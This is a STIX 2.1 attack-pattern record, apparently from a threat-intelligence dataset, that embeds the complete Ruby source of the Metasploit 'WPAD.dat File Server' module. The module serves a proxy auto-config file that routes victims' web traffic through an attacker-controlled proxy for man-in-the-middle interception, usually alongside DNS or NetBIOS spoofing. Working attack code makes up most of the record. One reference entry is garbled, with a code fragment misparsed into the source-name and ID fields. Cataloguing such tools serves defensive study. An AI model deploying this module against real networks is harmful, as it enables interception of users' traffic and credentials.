{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1545c912-280a-4df6-b7be-3736779ea3a1",
    "created": "2024-08-14T16:21:58.068429Z",
    "modified": "2024-08-14T16:21:58.068433Z",
    "name": "WPAD.dat File Server",
    "description": " This module generates a valid wpad.dat file for WPAD mitm attacks. Usually this module is used in combination with DNS attacks or the 'NetBIOS Name Service Spoofer' module. Please remember as the server will be running by default on TCP port 80 you will need the required privileges to open that port. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/wpad.rb",
            "external_id": "wpad.rb"
        },
        {
            "source_name": "functionFindProxyForURL(url",
            "external_id": "host){"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'WPAD.dat File Server',\n      'Description' => %q{\n          This module generates a valid wpad.dat file for WPAD mitm\n        attacks. Usually this module is used in combination with DNS attacks\n        or the 'NetBIOS Name Service Spoofer' module. Please remember as the\n        server will be running by default on TCP port 80 you will need the\n        required privileges to open that port.\n      },\n      'Author'      =>\n        [\n          'et'            # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'DefaultOptions' =>\n        {\n          'SRVPORT' => 80\n        },\n      'Passive' => true))\n\n    register_options(\n      [\n        OptAddress.new('EXCLUDENETWORK', [ true, \"Network to exclude\",'127.0.0.1' ]),\n        OptAddress.new('EXCLUDENETMASK', [ true, \"Netmask to exclude\",'255.255.255.0' ]),\n        OptAddress.new('PROXY', [ true, \"Proxy to redirect traffic to\", '0.0.0.0' ]),\n        OptPort.new('PROXYPORT',[ true, \"Proxy port\", 8080 ])\n      ])\n\n    deregister_options('URIPATH')\n  end\n\n\n  def on_request_uri(cli, request)\n    vprint_status(\"Request '#{request.method} #{request.headers['user-agent']}\")\n\n    return send_not_found(cli) if request.method == \"POST\"\n\n    html = <<-EOS\nfunction FindProxyForURL(url, host) {\n      // URLs within this network are accessed directly\n      if (isInNet(host, \"#{datastore['EXCLUDENETWORK']}\", \"#{datastore['EXCLUDENETMASK']}\"))\n      {\n         return \"DIRECT\";\n      }\n      return \"PROXY #{datastore['PROXY']}:#{datastore['PROXYPORT']}; DIRECT\";\n   }\nEOS\n\n    print_status(\"Sending WPAD config\")\n    send_response_html(cli, html,\n      {\n        'Content-Type' => 'application/x-ns-proxy-autoconfig'\n      })\n  end\n\n  def resource_uri\n    \"/wpad.dat\"\n  end\n\n  def primer\n    hardcoded_uripath(\"/proxy.pac\")\n  end\n\n  def run\n    # This should probably be added to the Http mixin's run method\n    begin\n      exploit\n    rescue Errno::EACCES => e\n      if e.message =~ /Permission denied - bind/\n        print_error(\"You need to have permission to bind to #{datastore['SRVPORT']}\")\n      else\n        raise e\n      end\n    end\n  end\nend\n\n"
}